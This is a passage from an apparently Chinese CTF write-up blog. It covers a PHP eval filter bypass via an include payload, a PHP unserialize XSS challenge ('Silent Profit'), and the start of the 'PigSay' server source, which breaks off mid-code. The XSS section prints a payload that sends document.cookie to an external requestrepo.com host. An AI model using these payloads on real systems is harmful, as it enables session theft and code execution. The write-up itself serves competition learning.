class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;?&quot;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]);</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$filtered</span> . <span class="string">&#x27;();&#x27;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;strong&gt;After Security Filtering:&lt;/strong&gt; &lt;span class=&quot;filtered&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$cmd</span>) . <span class="string">&#x27;&lt;/span&gt;&#x27;</span> . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;strong&gt;Execution Result:&lt;/strong&gt;&#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;&quot;&gt;&#x27;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;span class=&quot;success&quot;&gt;✅ Function executed successfully!&lt;/span&gt;&#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$result</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;span class=&quot;success&quot;&gt;✅ Function executed (no output)&lt;/span&gt;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;span class=&quot;error&quot;&gt;❌ Error: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()) . <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;span class=&quot;error&quot;&gt;❌ Exception: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()) . <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注释可以绕过，现在想办法包含文件就行，打印数组什么的是不太可能了，<code>DIRECTORY_SEPARATOR</code> 是一个 <strong>PHP 预定义常量</strong>，用于表示当前操作系统的目录分隔符。它的作用是使代码能够在不同操作系统上正确运行。也就是说在Windows上面是<code>\</code>，在类unix上面是<code>/</code>。相当牛逼，网上查到可以用Heredoc语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include%20DIRECTORY%5FSEPARATOR%2E%3C%3C%3CF%0Aflag%0AF%3B%23</span><br></pre></td></tr></table></figure><p>不过当我们知道这个变量之后问题就迎刃而解了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> DIRECTORY_SEPARATOR.flag;%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="Silent-Profit"><a href="#Silent-Profit" class="headerlink" title="Silent Profit"></a><strong>Silent Profit</strong></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>[<span class="string">&#x27;FLAG&#x27;</span>] ?? <span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>?.<span class="property">BOT_PORT</span> || <span class="number">31337</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; url &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url || !url.<span class="title function_">startsWith</span>(<span class="string">&#x27;http://challenge/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid URL&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting: <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">      <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">      <span class="attr">args</span>: [</span><br><span class="line">        <span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>,</span><br><span class="line">      ]</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">setCookie</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: flag, <span class="attr">domain</span>: <span class="string">&#x27;challenge&#x27;</span> &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle2&#x27;</span>, <span class="attr">timeout</span>: <span class="number">5000</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">waitForNetworkIdle</span>(&#123;<span class="attr">timeout</span>: <span class="number">5000</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;URL visited by bot!&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[!] Error visiting URL:`</span>, err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Bot error visiting URL&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    &lt;h2&gt;XSS Bot&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;POST&quot; action=&quot;/report&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;url&quot; value=&quot;http://challenge/?data=...&quot; style=&quot;width: 500px;&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  `</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`XSS bot running at port <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原生类的尝试，能够进行xss的只有Error&#x2F;Exception，注意到是PHP&#x2F;8.4.8，队友问AI说哪些类可以序列化，发现关键类<code>DateInterval</code>，手动构造payload成功弹窗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">&quot;A5rZ&lt;script&gt;alert(`xss`)&lt;/script&gt;&quot;</span></span><br><span class="line">pay_end = <span class="string">&#x27;O:12:&quot;DateInterval&quot;:10:&#123;s:1:&quot;y&quot;;i:2;s:1:&quot;m&quot;;i:0;s:1:&quot;d&quot;;i:4;s:1:&quot;h&quot;;i:6;s:1:&quot;i&quot;;i:30;s:1:&quot;s&quot;;i:0;s:1:&quot;f&quot;;d:0;s:6:&quot;invert&quot;;i:0;s:&#x27;</span>+ <span class="built_in">str</span>(<span class="built_in">len</span>(pay)) + <span class="string">&#x27;:&quot;&#x27;</span> + pay + <span class="string">&#x27;&quot;;b:0;s:11:&quot;from_string&quot;;b:0;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pay_end)</span><br></pre></td></tr></table></figure><p>直接Xbot就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">&quot;A5rZ&lt;script&gt;fetch(`$&#123;&#x27;https://kpkledvh.requestrepo.com/&#x27;&#125;$&#123;document.cookie&#125;`)&lt;/script&gt;&quot;</span></span><br><span class="line">pay_end = <span class="string">&#x27;O:12:&quot;DateInterval&quot;:10:&#123;s:1:&quot;y&quot;;i:2;s:1:&quot;m&quot;;i:0;s:1:&quot;d&quot;;i:4;s:1:&quot;h&quot;;i:6;s:1:&quot;i&quot;;i:30;s:1:&quot;s&quot;;i:0;s:1:&quot;f&quot;;d:0;s:6:&quot;invert&quot;;i:0;s:&#x27;</span>+ <span class="built_in">str</span>(<span class="built_in">len</span>(pay)) + <span class="string">&#x27;:&quot;&#x27;</span> + pay + <span class="string">&#x27;&quot;;b:0;s:11:&quot;from_string&quot;;b:0;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pay_end)</span><br></pre></td></tr></table></figure><p>不得不说，A5rZ师傅太强了</p><h2 id="PigSay"><a href="#PigSay" class="headerlink" title="PigSay"></a><strong>PigSay</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> importlib <span class="keyword">import</span> reload</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> environ</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> NamedTemporaryFile, TemporaryDirectory</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> pigsay</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">from</span> litestar <span class="keyword">import</span> Litestar, get, post</span><br><span class="line"><span class="keyword">from</span> litestar.datastructures <span class="keyword">import</span> UploadFile</span><br><span class="line"><span class="keyword">from</span> litestar.params <span class="keyword">import</span> Body</span><br><span class="line"><span class="keyword">from</span> litestar.static_files <span class="keyword">import</span> create_static_files_router</span><br><span class="line"></span><br><span class="line">JWT_KEY = environ.pop(<span class="string">&quot;JWT_KEY&quot;</span>).encode()</span><br><span class="line">PIG_KEY = environ.pop(<span class="string">&quot;PIG_KEY&quot;</span>).encode()</span><br><span class="line">converter = pigsay.PigConverter(PIG_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@get(<span class="params"><span class="string">&quot;/api/ping&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ping</span>() -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Ping? Pong!</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;pong&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/encrypt&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Encrypt some text to pigsay text.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = converter.encrypt_string(<span class="built_in">str</span>(data[<span class="string">&quot;text&quot;</span>]))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;encrypt success&quot;</span>, <span class="string">&quot;data&quot;</span>: ret&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;encrypt error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/decrypt&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Decrypt some pigsay text.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = converter.decrypt_string(<span class="built_in">str</span>(data[<span class="string">&quot;text&quot;</span>]))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;decrypt success&quot;</span>, <span class="string">&quot;data&quot;</span>: ret&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;decrypt error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_file_type</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    allows = [<span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>, <span class="string">&quot;.tar.gz&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>([filename.endswith(allow) <span class="keyword">for</span> allow <span class="keyword">in</span> allows])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uncompress_file</span>(<span class="params">filepath: <span class="built_in">str</span>, handler: <span class="built_in">callable</span></span>):</span><br><span class="line">    file = Path(filepath)</span><br><span class="line">    suffix = <span class="string">&quot;&quot;</span>.join(file.suffixes)</span><br><span class="line">    <span class="keyword">with</span> TemporaryDirectory(uuid4().<span class="built_in">hex</span>) <span class="keyword">as</span> tmp_dir:</span><br><span class="line">        tmp_dir = Path(tmp_dir)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            args = (filepath, <span class="built_in">str</span>(tmp_dir.absolute()))</span><br><span class="line">            <span class="keyword">match</span> suffix:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">                    unzip_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.rar&quot;</span>:</span><br><span class="line">                    unrar_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.7z&quot;</span>:</span><br><span class="line">                    un7z_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.tar.gz&quot;</span>:</span><br><span class="line">                    untar_file(*args)</span><br><span class="line">                <span class="keyword">case</span> _:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">f&quot;Unsupported file type: <span class="subst">&#123;suffix&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&quot;code&quot;</span>: <span class="number">20000</span>,</span><br><span class="line">                <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                    item.name: handler(item.read_text())</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> tmp_dir.glob(<span class="string">&quot;*.txt&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Uncompress file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unzip_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(filepath) <span class="keyword">as</span> zf:</span><br><span class="line">        zf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unrar_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> rarfile.RarFile(filepath) <span class="keyword">as</span> rf:</span><br><span class="line">        rf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">un7z_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(filepath) <span class="keyword">as</span> sf:</span><br><span class="line">        sf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untar_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(filepath, <span class="string">&quot;r:gz&quot;</span>) <span class="keyword">as</span> tf:</span><br><span class="line">        tf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/file/encrypt&quot;</span>, request_max_body_size=<span class="number">1024</span> * <span class="number">1024</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params"></span></span><br><span class="line"><span class="params">    data: UploadFile = Body(<span class="params">media_type=<span class="string">&quot;multipart/form-data&quot;</span></span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We can encrypt some txt file in a compressed file</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    filename = data.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_file_type(filename):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid file type&quot;</span>&#125;</span><br><span class="line">    content = <span class="keyword">await</span> data.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> NamedTemporaryFile(mode=<span class="string">&quot;wb&quot;</span>, suffix=filename) <span class="keyword">as</span> tmp:</span><br><span class="line">            tmp.write(content)</span><br><span class="line">            tmp.seek(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> uncompress_file(tmp.name, converter.encrypt_string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Encrypt file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/file/decrypt&quot;</span>, request_max_body_size=<span 